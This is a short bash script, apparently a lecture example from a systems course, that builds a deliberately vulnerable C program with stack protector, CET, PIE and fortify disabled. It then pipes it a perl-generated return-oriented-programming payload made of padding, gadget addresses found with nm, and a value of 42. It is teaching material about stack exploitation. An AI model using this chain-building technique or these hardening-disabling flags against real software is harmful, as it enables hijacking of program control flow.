#!/bin/bash
# Compile rop.c for x86-64 and feed it the two-gadget chain.
# On the Mac this hands the same script to the ics2026 container.
set -euo pipefail
cd "$(dirname "$0")"
if [ "$(uname -s)" != "Linux" ] || [ "$(uname -m)" != "x86_64" ]; then
    exec docker exec ics2026 bash /ics/lectures/3-asm/examples/rop.sh
fi
gcc -Og -fomit-frame-pointer -fno-stack-protector -fcf-protection=none -no-pie \
    -Wno-stringop-overflow -U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=0 -o rop rop.c
pop=$(nm rop | awk '$3=="gadget_pop"{print $1}')
num=$(nm rop | awk '$3=="print_num"{print $1}')
echo "返回地址还在："
printf hi | ./rop
echo "换成图中的三个值："
perl -e '
    print "A" x 24;
    print pack("Q<", hex($ARGV[0]));
    print pack("Q<", 42);
    print pack("Q<", hex($ARGV[1]));
' "$pop" "$num" | ./rop
